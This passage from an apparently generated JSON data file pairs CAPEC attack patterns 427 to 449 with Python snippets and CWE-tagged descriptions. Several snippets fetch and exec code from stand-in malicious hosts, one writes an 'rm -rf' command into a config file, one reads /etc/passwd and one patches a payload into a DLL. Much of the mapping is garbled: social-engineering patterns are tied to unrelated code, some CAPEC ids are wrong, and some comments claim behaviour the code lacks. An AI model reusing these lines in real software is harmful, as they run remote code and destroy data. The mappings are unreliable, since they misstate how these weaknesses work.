        "code_snippet": "import getpass\n\n# CWE-654: Reliance on a Single Factor in a Security Decision\n# CWE-301: Reflection Attack in an Authentication Protocol\n# CWE-205: Observable Behavioral Discrepancy\n\n# Simulated user database\nuser_db = {'admin': 'password123'}\n\n# Function to authenticate user\ndef authenticate(username, password):\n    if username in user_db and user_db[username] == password:\n        return True\n    return False\n\n# Function to simulate a reflection attack\ndef reflection_attack(username):\n    # Attacker uses the same username to reflect the authentication\n    return authenticate(username, 'password123')\n\n# Main function\nif __name__ == '__main__':\n    username = input('Enter username: ')\n    password = getpass.getpass('Enter password: ')\n\n    # CWE-654: Single factor authentication\n    if authenticate(username, password):\n        print('Access granted')\n    else:\n        print('Access denied')\n\n    # CWE-205: Observable behavioral discrepancy\n    if username == 'admin':\n        print('Admin access attempt detected')\n\n    # Simulate reflection attack\n    if reflection_attack(username):\n        print('Reflection attack successful')\n    else:\n        print('Reflection attack failed')",
        "description": "This Python code snippet demonstrates several security weaknesses related to the CAPEC 'Influence via Psychological Principles'. The code includes a simple authentication mechanism (CWE-654) that relies on a single factor (username and password). It also simulates a reflection attack (CWE-301) where an attacker can use the same username to gain unauthorized access. Additionally, the code reveals an observable behavioral discrepancy (CWE-205) by printing a specific message when an 'admin' access attempt is detected. This can provide unauthorized actors with information about the internal state of the system, potentially aiding in further attacks."
    },
    {
        "capec_id": "428",
        "capec_name": "Influence via Modes of Thinking",
        "code_snippet": "import socket\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-301: Reflection Attack in an Authentication Protocol\n\ndef create_socket_connection(host, port):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((host, port))\n    return s\n\n# CWE-222: Truncation of Security-relevant Information\n# CWE-1229: Creation of Emergent Resource\n\ndef send_message(s, message):\n    truncated_message = message[:10]  # Truncate message to 10 characters\n    s.sendall(truncated_message.encode('utf-8'))\n    response = s.recv(1024)\n    return response\n\n# CAPEC: Influence via Modes of Thinking\n# Tailoring communication to the target's language and thought patterns\n\ndef communicate_with_target(host, port, message):\n    s = create_socket_connection(host, port)\n    response = send_message(s, message)\n    print(f\"Received: {response.decode('utf-8')}\")\n    s.close()\n\n# Example usage\nhost = 'example.com'\nport = 12345\nmessage = 'Hello, this is a test message tailored to your thinking patterns.'\ncommunicate_with_target(host, port, message)",
        "description": "This Python code snippet demonstrates a vulnerable communication setup that embodies the CAPEC concept of 'Influence via Modes of Thinking' by tailoring messages to the target's language and thought patterns. The code creates a socket connection to a specified host and port (CWE-940, CWE-300), sends a truncated message (CWE-222), and receives a response. The truncation of the message can obscure the source or nature of an attack, and the improper verification of the communication channel can allow unauthorized access. Additionally, the code does not verify the source of the incoming request, making it susceptible to reflection attacks (CWE-301). The overall idea is to show how an adversary can manipulate communication to influence the target while exploiting various weaknesses in the communication protocol."
    },
    {
        "capec_id": "429",
        "capec_name": "Target Influence via Eye Cues",
        "code_snippet": "import random\n\nclass EyeMovementTracker:\n    def __init__(self):\n        self.internal_state = random.choice(['secure', 'insecure'])\n        self.security_info = 'Sensitive Data'\n\n    def display_info(self):\n        if self.internal_state == 'secure':\n            print('Displaying: Secure Information')\n        else:\n            print('Displaying: ' + self.security_info[:5] + '...')  # CWE-222: Truncation of Security-relevant Information\n\n    def process_eye_movement(self, eye_movement):\n        if eye_movement == 'suspicious':\n            self.internal_state = 'insecure'  # CWE-205: Observable Behavioral Discrepancy\n        else:\n            self.internal_state = 'secure'\n\n    def get_internal_state(self):\n        return self.internal_state  # CWE-203: Observable Discrepancy\n\n# Simulate eye movement tracking\ntracker = EyeMovementTracker()\ntracker.process_eye_movement('suspicious')\nprint('Internal State:', tracker.get_internal_state())\ntracker.display_info()",
        "description": "This Python code snippet simulates an eye movement tracker that changes its internal state based on the observed eye movements of a user. The `EyeMovementTracker` class has an internal state that can be 'secure' or 'insecure'. The `process_eye_movement` method changes the internal state based on the input eye movement, which can be 'suspicious' or not. The `display_info` method displays truncated security information if the state is 'insecure', embodying CWE-222. The `get_internal_state` method reveals the internal state, representing CWE-203. The code demonstrates how an adversary could infer the internal state of the system through observable discrepancies (CWE-205, CWE-203) and how truncation of information (CWE-222) can obscure the nature of the security state."
    },
    {
        "capec_id": "430",
        "capec_name": "DEPRECATED:  Target Influence via Micro-Expressions",
        "code_snippet": "import logging\nimport time\nimport random\n\n# Setup logging\nlogging.basicConfig(filename='server.log', level=logging.DEBUG)\n\n# Simulate speculative execution vulnerability\nclass Processor:\n    def __init__(self):\n        self.secret_data = 'Sensitive Information'\n\n    def execute(self, condition):\n        if condition:\n            # Transient execution path\n            logging.debug(f'Executing transient path with secret data: {self.secret_data}')\n        else:\n            # Correct execution path\n            logging.debug('Executing correct path')\n\n# Simulate excessive attack surface by exposing unnecessary methods\nclass Server:\n    def __init__(self):\n        self.processor = Processor()\n\n    def handle_request(self, user_input):\n        # Simulate a condition that could lead to speculative execution\n        condition = random.choice([True, False])\n        self.processor.execute(condition)\n        return 'Request handled'\n\n# Main function to simulate server handling requests\nif __name__ == '__main__':\n    server = Server()\n    for _ in range(10):\n        user_input = input('Enter request: ')\n        print(server.handle_request(user_input))\n        time.sleep(1)",
        "description": "This Python code snippet simulates a speculative execution vulnerability in a processor, which can lead to the exposure of sensitive information. The `Processor` class has a method `execute` that logs sensitive data when a certain condition is met, representing transient execution paths. The `Server` class exposes an excessive attack surface by providing unnecessary methods that can be exploited. The main function simulates handling multiple requests, potentially exposing sensitive information through server log files. This code embodies the main idea of the deprecated CAPEC by demonstrating how micro-expressions (speculative execution) can influence target behavior and expose sensitive information."
    },
    {
        "capec_id": "431",
        "capec_name": "DEPRECATED:  Target Influence via Neuro-Linguistic Programming (NLP)",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/submit', methods=['POST'])\ndef submit():\n    user_input = request.form['user_input']\n    if not validate_syntax(user_input):\n        error_message = f\"Error: Invalid input '{user_input}'\"\n        return render_template_string('<h1>{{ error_message }}</h1>', error_message=error_message)\n    return 'Input is valid'\n\ndef validate_syntax(input_str):\n    # Placeholder for actual syntax validation logic\n    return True\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a vulnerable web application using Flask. The main idea is to demonstrate improper validation of input syntax (CWE-1286) and improper neutralization of special elements in a template engine (CWE-1336). The `validate_syntax` function is a placeholder and does not perform actual validation, leading to potential acceptance of malformed input. Additionally, the error message directly includes user input without proper neutralization, which could lead to script injection (CWE-81) and exposure of sensitive information (CWE-209). The excessive attack surface (CWE-1125) is implied by the lack of input validation and neutralization, making the application more susceptible to various attacks."
    },
    {
        "capec_id": "432",
        "capec_name": "DEPRECATED:  Target Influence via Voice in NLP",
        "code_snippet": "import logging\n\n# CWE-532: Information Exposure Through Log Files\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\n\n# CWE-1286: Improper Validation of Syntactic Correctness of Input\ndef process_input(user_input):\n    if not isinstance(user_input, str):\n        raise ValueError('Input must be a string')\n    # CWE-149: Improper Neutralization of Quoting Syntax\n    if '\"' in user_input or \"'\" in user_input:\n        raise ValueError('Input contains invalid characters')\n    logging.debug(f'Processing input: {user_input}')\n    # Simulate processing\n    return f'Processed: {user_input}'\n\n# CWE-804: Guessable CAPTCHA\ndef validate_captcha(captcha_response):\n    if captcha_response == '1234':  # Weak CAPTCHA\n        return True\n    return False\n\n# Example usage\nuser_input = 'Hello, World!'\ncaptcha_response = '1234'\n\nif validate_captcha(captcha_response):\n    result = process_input(user_input)\n    print(result)\nelse:\n    print('CAPTCHA validation failed')",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the deprecated CAPEC 'Target Influence via Voice in NLP' and associated CWEs. The code includes improper validation of input syntax (CWE-1286), improper neutralization of quoting syntax (CWE-149), and a guessable CAPTCHA (CWE-804). Additionally, it logs sensitive information (CWE-532). The `process_input` function checks if the input is a string and contains invalid characters, but the logging of the input can expose sensitive data. The `validate_captcha` function uses a weak CAPTCHA that can be easily guessed. This code highlights the importance of proper input validation, secure logging practices, and robust CAPTCHA mechanisms."
    },
    {
        "capec_id": "433",
        "capec_name": "Target Influence via The Human Buffer Overflow",
        "code_snippet": "import socket\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-924: Improper Enforcement of Message Integrity During Transmission\n# CWE-120: Buffer Copy without Checking Size of Input\n\ndef send_message(host, port, message):\n    try:\n        # Establish a connection\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((host, port))\n\n        # CWE-319: Sending sensitive information in cleartext\n        s.sendall(message.encode('utf-8'))\n\n        # CWE-924: No integrity check on the received message\n        response = s.recv(1024)\n        print('Received:', response.decode('utf-8'))\n\n    except Exception as e:\n        print('Error:', e)\n    finally:\n        s.close()\n\n# CWE-120: Buffer Copy without Checking Size of Input\n# This function simulates a buffer overflow vulnerability\n\ndef vulnerable_buffer_copy(input_data):\n    buffer = bytearray(10)  # Small buffer\n    for i in range(len(input_data)):\n        buffer[i] = input_data[i]  # No size check, potential overflow\n    return buffer\n\n# Example usage\nhost = 'localhost'\nport = 12345\nmessage = 'Sensitive data'\n\n# Send a message with potential vulnerabilities\nsend_message(host, port, message)\n\n# Simulate a buffer overflow\ninput_data = bytearray(b'A' * 20)  # Input larger than buffer size\nvulnerable_buffer_copy(input_data)",
        "description": "This Python code snippet demonstrates the concept of 'Target Influence via The Human Buffer Overflow' by embedding multiple vulnerabilities that can be exploited. The `send_message` function establishes a socket connection and sends a message in cleartext (CWE-319), without ensuring the integrity of the message during transmission (CWE-924). The `vulnerable_buffer_copy` function simulates a classic buffer overflow (CWE-120) by copying data into a buffer without checking the size of the input, potentially leading to memory corruption. These vulnerabilities illustrate how an attacker could exploit weaknesses in communication and memory handling to influence or compromise a system."
    },
    {
        "capec_id": "434",
        "capec_name": "Target Influence via Interview and Interrogation",
        "code_snippet": "import random\n\nclass SensitiveDataHandler:\n    def __init__(self):\n        self.sensitive_data = {'user1': 'password123', 'user2': 'qwerty456'}\n        self.security_policy = {'admin': 'full_access', 'user': 'limited_access'}\n\n    def query_data(self, user_role, query):\n        if user_role not in self.security_policy:\n            return 'Access Denied'\n        if user_role == 'admin':\n            return self.sensitive_data\n        else:\n            # CWE-202: Exposure of Sensitive Information Through Data Queries\n            if 'password' in query:\n                return 'Sensitive information cannot be disclosed'\n            return {k: v for k, v in self.sensitive_data.items() if 'password' not in v}\n\n    def captcha_challenge(self):\n        # CWE-804: Guessable CAPTCHA\n        captcha = random.choice(['1234', 'abcd', '5678'])\n        return captcha\n\n    def authenticate(self, user_input):\n        captcha = self.captcha_challenge()\n        if user_input == captcha:\n            return 'Authenticated'\n        else:\n            return 'Authentication Failed'\n\nhandler = SensitiveDataHandler()\nprint(handler.query_data('user', 'password'))\nprint(handler.authenticate('1234'))",
        "description": "This Python code snippet demonstrates a class `SensitiveDataHandler` that handles sensitive data queries and authentication using CAPTCHA. The `query_data` method shows how sensitive information can be exposed through data queries (CWE-202) by returning partial data based on the user's role. The `captcha_challenge` method generates a CAPTCHA that is easily guessable (CWE-804), representing a weak security measure. The `authenticate` method uses this CAPTCHA for user authentication. The code embodies the main idea of CAPEC 'Target Influence via Interview and Interrogation' by showing how an attacker could infer sensitive information through data queries and exploit weak CAPTCHA challenges."
    },
    {
        "capec_id": "435",
        "capec_name": "Target Influence via Instant Rapport",
        "code_snippet": "import socket\n\n# Vulnerable function to establish a communication channel\n\ndef establish_channel(destination):\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((destination, 8080))\n        return s\n    except Exception as e:\n        print(f\"Connection failed: {e}\")\n        return None\n\n# Function to handle incoming requests without proper verification\n\ndef handle_request(conn):\n    try:\n        data = conn.recv(1024)\n        if data:\n            print(f\"Received data: {data}\")\n            # Observable behavioral discrepancy\n            if b'secret' in data:\n                print(\"Sensitive operation triggered\")\n            else:\n                print(\"Normal operation\")\n    except Exception as e:\n        print(f\"Error handling request: {e}\")\n\n# Example usage\nif __name__ == \"__main__\":\n    # Incorrectly specified destination\n    conn = establish_channel('192.168.1.100')\n    if conn:\n        handle_request(conn)\n        conn.close()",
        "description": "This Python code snippet demonstrates a vulnerable implementation of a communication channel, embodying the main idea of 'Target Influence via Instant Rapport' and related CWEs. The 'establish_channel' function attempts to connect to a specified destination without verifying the identity of the endpoint (CWE-300). The 'handle_request' function processes incoming data without verifying the source (CWE-940) and exhibits observable behavioral discrepancies based on the content of the data (CWE-205). Additionally, the destination for the outgoing request is not correctly specified (CWE-941), and the code does not prevent external influence on control spheres (CWE-673). This snippet highlights how inadequate verification and improper handling of communication channels can lead to security vulnerabilities."
    },
    {
        "capec_id": "438",
        "capec_name": "Modification During Manufacture",
        "code_snippet": "import os\n\nclass Device:\n    def __init__(self, firmware_path):\n        self.firmware_path = firmware_path\n        self.firmware = self.load_firmware()\n\n    def load_firmware(self):\n        if not os.path.exists(self.firmware_path):\n            raise FileNotFoundError('Firmware file not found')\n        with open(self.firmware_path, 'r') as file:\n            return file.read()\n\n    def update_firmware(self, new_firmware_path):\n        if not os.path.exists(new_firmware_path):\n            raise FileNotFoundError('New firmware file not found')\n        with open(new_firmware_path, 'r') as file:\n            self.firmware = file.read()\n        print('Firmware updated successfully')\n\n# Example usage\ntry:\n    device = Device('trusted_firmware.bin')\n    device.update_firmware('untrusted_firmware.bin')\nexcept FileNotFoundError as e:\n    print(e)",
        "description": "This Python code snippet represents a simplified scenario where a device's firmware can be loaded and updated. The `Device` class initializes with a firmware path and loads the firmware from a file. The `update_firmware` method allows updating the firmware with a new file. This code embodies the main idea of CAPEC-439 (Modification During Manufacture) by demonstrating how an attacker could potentially replace the firmware with a malicious version during the manufacturing process. The related CWEs are represented as follows:\n- CWE-1357: The code assumes the firmware file is trustworthy without verification, representing reliance on an insufficiently trustworthy component.\n- CWE-1297: The firmware file could contain confidential information accessible to anyone with file access.\n- CWE-1269: The code does not check if the firmware is in a release configuration.\n- CWE-1059: The code lacks sufficient technical documentation for secure firmware handling.\n- CWE-1329: The code does not ensure that the firmware can be updated securely, representing reliance on a component that may not be updateable."
    },
    {
        "capec_id": "439",
        "capec_name": "Manipulation During Distribution",
        "code_snippet": "import requests\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\n# Using a third-party library with known vulnerabilities\nresponse = requests.get('http://example.com/api/data')\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# Exposing sensitive information in the response\nif response.status_code == 200:\n    print('Sensitive Data:', response.text)\n\n# CWE-1269: Product Released in Non-Release Configuration\n# Debug mode enabled in production\nDEBUG = True\nif DEBUG:\n    print('Debugging Information: Response Headers:', response.headers)\n\n# CWE-1357: Reliance on Insufficiently Trustworthy Component\n# Using an untrusted component for critical functionality\ntry:\n    import untrusted_component\n    untrusted_component.perform_critical_task()\nexcept ImportError:\n    print('Failed to import untrusted component')\n\n# CWE-207: Observable Behavioral Discrepancy With Equivalent Products\n# Different behavior in debug mode\nif DEBUG:\n    print('Debug mode is enabled')\nelse:\n    print('Debug mode is disabled')",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'Manipulation During Distribution'. It uses a third-party library with known vulnerabilities (CWE-1395), exposes sensitive information to unauthorized actors (CWE-200), runs in a non-release configuration with debug mode enabled (CWE-1269), relies on an insufficiently trustworthy component (CWE-1357), and exhibits observable behavioral discrepancies (CWE-207). These issues highlight the risks of tampering and manipulation during the distribution of software products."
    },
    {
        "capec_id": "440",
        "capec_name": "Hardware Integrity Attack",
        "code_snippet": "import random\n\nclass HardwareComponent:\n    def __init__(self, version):\n        self.version = version\n        self.redundant_block = [0] * 10  # Simulating a redundant block\n        self.voltage = 5  # Normal operating voltage\n        self.clock_speed = 2.5  # Normal clock speed in GHz\n\n    def inject_error(self):\n        # CWE-1334: Unauthorized Error Injection\n        index = random.randint(0, len(self.redundant_block) - 1)\n        self.redundant_block[index] = 1  # Injecting an error\n        print(f\"Error injected at index {index}\")\n\n    def glitch_voltage_clock(self):\n        # CWE-1247: Improper Protection Against Voltage and Clock Glitches\n        self.voltage = random.uniform(0, 10)  # Random voltage glitch\n        self.clock_speed = random.uniform(0, 5)  # Random clock glitch\n        print(f\"Voltage set to {self.voltage}V, Clock speed set to {self.clock_speed}GHz\")\n\n    def downgrade_firmware(self, new_version):\n        # CWE-1328: Security Version Number Mutable to Older Versions\n        self.version = new_version\n        print(f\"Firmware downgraded to version {self.version}\")\n\n# Simulating an attack\ncomponent = HardwareComponent(version=2.0)\ncomponent.inject_error()\ncomponent.glitch_voltage_clock()\ncomponent.downgrade_firmware(1.0)",
        "description": "This Python code snippet simulates a hardware integrity attack by exploiting various weaknesses described in the CAPEC and related CWEs. The `HardwareComponent` class represents a hardware component with a version number, a redundant block, and normal operating voltage and clock speed. The `inject_error` method simulates unauthorized error injection (CWE-1334), the `glitch_voltage_clock` method simulates improper protection against voltage and clock glitches (CWE-1247), and the `downgrade_firmware` method simulates the ability to downgrade the firmware to an older, potentially vulnerable version (CWE-1328). This code demonstrates how an adversary might exploit these weaknesses to compromise the integrity of a hardware component."
    },
    {
        "capec_id": "441",
        "capec_name": "Malicious Logic Insertion",
        "code_snippet": "import os\nimport sys\n\n# CWE-506: Embedded Malicious Code\n# This function simulates a benign operation but contains hidden malicious logic\n\ndef benign_function():\n    print(\"Performing a benign operation...\")\n    # CWE-284: Improper Access Control\n    # Attempt to gain unauthorized access to a system resource\n    try:\n        os.system('echo Malicious code executed!')\n    except Exception as e:\n        print(f\"Error: {e}\")\n\n# CWE-509: Replicating Malicious Code (Virus or Worm)\n# This function attempts to replicate itself to another location\n\ndef replicate_malicious_code():\n    try:\n        with open(sys.argv[0], 'r') as source_file:\n            code = source_file.read()\n        with open('/tmp/malicious_copy.py', 'w') as target_file:\n            target_file.write(code)\n        print(\"Malicious code replicated!\")\n    except Exception as e:\n        print(f\"Error: {e}\")\n\nif __name__ == '__main__':\n    benign_function()\n    replicate_malicious_code()",
        "description": "This Python code snippet demonstrates the concept of 'Malicious Logic Insertion' by embedding hidden malicious logic within a seemingly benign function. The 'benign_function' simulates a harmless operation but contains a hidden command execution (CWE-506: Embedded Malicious Code) that could be used to perform unauthorized actions (CWE-284: Improper Access Control). Additionally, the 'replicate_malicious_code' function attempts to replicate the script to another location (CWE-509: Replicating Malicious Code), simulating the behavior of a virus or worm. This code embodies the main idea of the CAPEC by showing how malicious logic can be inserted into a fielded system to achieve negative impacts."
    },
    {
        "capec_id": "442",
        "capec_name": "Infected Software",
        "code_snippet": "import os\nimport requests\n\n# Benign function\ndef legitimate_function():\n    print('This is a legitimate function.')\n\n# Malicious code hidden within the software\ndef malicious_code():\n    # Downloading and executing code without integrity check (CWE-494)\n    response = requests.get('http://malicious-website.com/malicious_script.py')\n    exec(response.text)\n\n# Trojan Horse: Appears benign but contains hidden malicious code (CWE-507)\ndef trojan_horse():\n    legitimate_function()\n    if os.getenv('RUN_MALICIOUS') == 'true':\n        malicious_code()\n\n# Simulate running the trojan horse\nif __name__ == '__main__':\n    trojan_horse()",
        "description": "This Python code snippet demonstrates the concept of 'Infected Software' as described in the CAPEC. The 'trojan_horse' function appears to be a benign function that calls 'legitimate_function'. However, it contains hidden malicious code that is executed based on an environment variable 'RUN_MALICIOUS'. The 'malicious_code' function downloads and executes a script from a remote location without verifying its integrity (CWE-494), representing a common method of embedding malicious logic. This snippet embodies the idea of embedding malicious code within otherwise benign software, which can be activated under certain conditions, aligning with the CAPEC description and related CWEs."
    },
    {
        "capec_id": "443",
        "capec_name": "Malicious Logic Inserted Into Product by Authorized Developer",
        "code_snippet": "import os\nimport requests\n\nclass MaliciousModule:\n    def __init__(self):\n        self.url = 'http://malicious.example.com/malware.py'\n        self.download_and_execute()\n\n    def download_and_execute(self):\n        response = requests.get(self.url)\n        if response.status_code == 200:\n            exec(response.text)\n\n    def create_insecure_file(self):\n        with open('/tmp/insecure_file.txt', 'w') as f:\n            f.write('This is an insecure file.')\n        os.chmod('/tmp/insecure_file.txt', 0o777)\n\n    def disable_admin_control(self):\n        os.system('echo \"Disabling admin control\" > /etc/admin_control_disabled')\n\n# Injecting the malicious logic into the product\nmalicious_logic = MaliciousModule()",
        "description": "This Python code snippet represents the CAPEC 'Malicious Logic Inserted Into Product by Authorized Developer' by demonstrating how an authorized developer might inject malicious logic into a codebase. The code includes several CWE-related vulnerabilities:\n\n1. CWE-494: The `download_and_execute` method downloads and executes code from a remote location without verifying its integrity.\n2. CWE-277: The `create_insecure_file` method creates a file with insecure permissions (world-writable).\n3. CWE-671: The `disable_admin_control` method disables administrative control over security settings.\n\nThe `MaliciousModule` class encapsulates these malicious actions, and an instance of this class is created at the end, simulating the injection of malicious logic into a product."
    },
    {
        "capec_id": "444",
        "capec_name": "Development Alteration",
        "code_snippet": "import os\n\n# CWE-506: Embedded Malicious Code\n# This function appears benign but contains malicious logic\n\ndef check_user_privileges(user):\n    # CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n    sensitive_info = os.popen('cat /etc/passwd').read()\n    if user == 'admin':\n        return True\n    else:\n        return False\n\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\n# Malicious code that can be triggered later\nexec_code = \"print('Executing malicious code')\"\nexec(exec_code)\n\n# CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n# CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n# Security-critical code that might be optimized away\nsecurity_check = True\nif security_check:\n    print('Security check passed')\nelse:\n    print('Security check failed')",
        "description": "This Python code snippet demonstrates a development alteration attack by embedding malicious logic within seemingly benign functions. The `check_user_privileges` function exposes sensitive system information (CWE-497) by reading the contents of `/etc/passwd`. The `exec_code` variable contains dynamically managed code that can be executed later (CWE-913). The security check at the end of the script represents security-critical code that might be optimized away by the compiler or processor (CWE-733 and CWE-1037). This code embodies the main idea of CAPEC-231 by showing how an adversary can modify a system during development to introduce vulnerabilities that can be exploited later."
    },
    {
        "capec_id": "445",
        "capec_name": "Malicious Logic Insertion into Product Software via Configuration Management Manipulation",
        "code_snippet": "import requests\nimport os\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_code.py'\nresponse = requests.get(url)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nexec(response.text)\n\n# CWE-506: Embedded Malicious Code\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\n# CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\n\ndef update_configuration(config_file):\n    with open(config_file, 'a') as f:\n        f.write('\\n# Malicious configuration change\\n')\n        f.write('os.system(\"rm -rf /important_data\")')\n\nupdate_configuration('config.txt')",
        "description": "This Python code snippet demonstrates a scenario where an adversary exploits a configuration management system to insert malicious logic into a software product. The code downloads a Python script from an untrusted source (CWE-494) and executes it without verifying its integrity (CWE-829). The downloaded script contains embedded malicious code (CWE-506) that improperly manipulates dynamically-managed code resources (CWE-913) by modifying a configuration file to include a destructive command. Additionally, the code could lead to unintended reentrant invocation issues (CWE-1265) if the configuration file is processed in a non-reentrant manner. This snippet encapsulates the main idea of CAPEC by showing how an adversary can manipulate configuration management to introduce malicious logic into a software product."
    },
    {
        "capec_id": "446",
        "capec_name": "Malicious Logic Insertion into Product via Inclusion of Third-Party Component",
        "code_snippet": "import requests\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n# CWE-1395: Dependency on Vulnerable Third-Party Component\n# CWE-1357: Reliance on Insufficiently Trustworthy Component\n# CWE-506: Embedded Malicious Code\n\n# Simulating the inclusion of a third-party component from an untrusted source\nurl = 'http://untrusted-source.com/malicious_component.py'\nresponse = requests.get(url)\n\n# CWE-1103: Use of Platform-Dependent Third Party Components\n# Assuming the component is platform-dependent and may not work across all platforms\nif response.status_code == 200:\n    exec(response.text)  # Executing the potentially malicious code\nelse:\n    print('Failed to retrieve the component')",
        "description": "This Python code snippet demonstrates the inclusion of a third-party component from an untrusted source, which embodies the main idea of the CAPEC 'Malicious Logic Insertion into Product via Inclusion of Third-Party Component'. The code fetches a Python script from a potentially malicious URL and executes it. This represents several CWEs: CWE-829 (inclusion of functionality from an untrusted control sphere), CWE-1395 (dependency on a vulnerable third-party component), CWE-1357 (reliance on an insufficiently trustworthy component), CWE-506 (embedded malicious code), and CWE-1103 (use of platform-dependent third-party components). The code highlights the risks associated with including and executing code from untrusted sources, which can lead to supply chain attacks."
    },
    {
        "capec_id": "447",
        "capec_name": "Design Alteration",
        "code_snippet": "import os\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# The server relies on the client to enforce access control, which is insecure.\nclass Server:\n    def __init__(self):\n        self.secret_data = \"Sensitive Information\"\n\n    def get_secret_data(self, user_role):\n        # CWE-657: Violation of Secure Design Principles\n        # Access control is enforced on the client side, which can be easily bypassed.\n        if user_role == 'admin':\n            return self.secret_data\n        else:\n            return \"Access Denied\"\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# Sensitive information is exposed to unauthorized users due to flawed design.\nclass Client:\n    def request_secret_data(self, server, user_role):\n        # Simulate a client-side check which can be easily bypassed\n        if user_role == 'admin' or user_role == 'user':\n            return server.get_secret_data(user_role)\n        else:\n            return \"Invalid Role\"\n\n# Simulate the design alteration attack\nserver = Server()\nclient = Client()\n\n# An attacker can easily bypass the client-side check and access sensitive data\nprint(client.request_secret_data(server, 'user'))  # Should be 'Access Denied' but returns sensitive data",
        "description": "This Python code snippet demonstrates a design alteration attack where the security mechanism is improperly enforced on the client side (CWE-602). The server relies on the client to enforce access control, which violates secure design principles (CWE-657). As a result, sensitive information is exposed to unauthorized users (CWE-497). The code simulates a scenario where an attacker can bypass the client-side check and access sensitive data, embodying the main idea of the CAPEC: modifying the design to introduce vulnerabilities that can be exploited later."
    },
    {
        "capec_id": "448",
        "capec_name": "Embed Virus into DLL",
        "code_snippet": "import ctypes\nimport os\n\n# CWE-426: Untrusted Search Path\n# CWE-506: Embedded Malicious Code\n# CWE-509: Replicating Malicious Code\n# CWE-497: Exposure of Sensitive System Information\n\n# Path to the legitimate DLL\nlegit_dll_path = 'C:\\path\\to\\legit.dll'\n\n# Malicious payload to be embedded\nmalicious_code = b'\\x90\\x90\\x90\\x90'  # NOP sled as a placeholder\n\n# Function to embed malicious code into the DLL\ndef embed_virus(dll_path, payload):\n    with open(dll_path, 'rb+') as dll_file:\n        content = dll_file.read()\n        # Find a gap to insert the payload (simplified for demonstration)\n        gap_index = content.find(b'\\x00' * len(payload))\n        if gap_index != -1:\n            dll_file.seek(gap_index)\n            dll_file.write(payload)\n\n# Embed the virus into the legitimate DLL\nembed_virus(legit_dll_path, malicious_code)\n\n# Load the tampered DLL (CWE-1102: Reliance on Machine-Dependent Data Representation)\ndll = ctypes.CDLL(legit_dll_path)\n\n# Function to simulate the virus spreading (CWE-509)\ndef spread_virus():\n    # This is a placeholder for the actual spreading logic\n    print('Virus spreading...')\n\n# Simulate the virus execution\nspread_virus()\n\n# Expose sensitive system information (CWE-497)\ndef expose_sensitive_info():\n    sensitive_info = os.popen('systeminfo').read()\n    print(sensitive_info)\n\n# Simulate the exposure of sensitive information\nexpose_sensitive_info()",
        "description": "This Python code snippet demonstrates the concept of embedding a virus into a DLL, as described in the CAPEC. The code includes several CWE-related vulnerabilities:\n\n1. **CWE-426 (Untrusted Search Path)**: The code assumes the path to the legitimate DLL without verifying its integrity.\n2. **CWE-506 (Embedded Malicious Code)**: The `embed_virus` function inserts a malicious payload into gaps within the DLL.\n3. **CWE-509 (Replicating Malicious Code)**: The `spread_virus` function simulates the virus's replication process.\n4. **CWE-497 (Exposure of Sensitive System Information)**: The `expose_sensitive_info` function retrieves and prints sensitive system information.\n5. **CWE-1102 (Reliance on Machine-Dependent Data Representation)**: The code relies on low-level data representation when loading the tampered DLL using `ctypes.CDLL`.\n\nThe main idea is to show how an adversary can tamper with a DLL to embed malicious code, which can then spread and expose sensitive information."
    },
    {
        "capec_id": "449",
        "capec_name": "DEPRECATED: Malware Propagation via USB Stick",
        "code_snippet": "import os\n\ndef execute_malicious_code():\n    # Malicious payload\n    print('Malicious code executed')\n\n# CWE-67: Improper Handling of Windows Device Names\nuser_input = input('Enter file path: ')\n\n# CWE-589: Call to Non-ubiquitous API\ntry:\n    if os.name == 'nt':\n        # Windows-specific API call\n        os.system(f'type {user_input}')\n    else:\n        # Non-Windows API call\n        os.system(f'cat {user_input}')\nexcept Exception as e:\n    print(f'Error: {e}')\n\n# CWE-507: Trojan Horse\nif user_input == 'malicious_path':\n    execute_malicious_code()\n\n# CWE-506: Embedded Malicious Code\n# This part of the code is hidden and not obvious to the user\nhidden_code = 'print(\"Hidden malicious code executed\")'\nexec(hidden_code)\n\n# CWE-1277: Firmware Not Updateable\n# Simulating a scenario where firmware cannot be updated\nfirmware_updateable = False\nif not firmware_updateable:\n    print('Firmware cannot be updated, potential security risk')",
        "description": "This Python code snippet demonstrates a scenario where multiple security weaknesses are present, embodying the main idea of CAPEC-448: Malware Infection into Product Software. The code includes:\n\n1. **CWE-67: Improper Handling of Windows Device Names** - The code takes user input for a file path, which could be a Windows device name, leading to potential denial of service or information exposure.\n2. **CWE-589: Call to Non-ubiquitous API** - The code uses platform-specific API calls (`type` for Windows and `cat` for others), which may not exist on all versions of the target platform, causing inconsistencies.\n3. **CWE-507: Trojan Horse** - The code contains a hidden malicious function (`execute_malicious_code`) that is executed when a specific condition is met.\n4. **CWE-506: Embedded Malicious Code** - The code includes hidden malicious code that is executed without the user's knowledge.\n5. **CWE-1277: Firmware Not Updateable** - The code simulates a scenario where the firmware cannot be updated, representing a potential security risk.\n\nOverall, the snippet illustrates how malware can be embedded in software, exploiting various weaknesses to propagate and execute malicious actions."
    },
    {
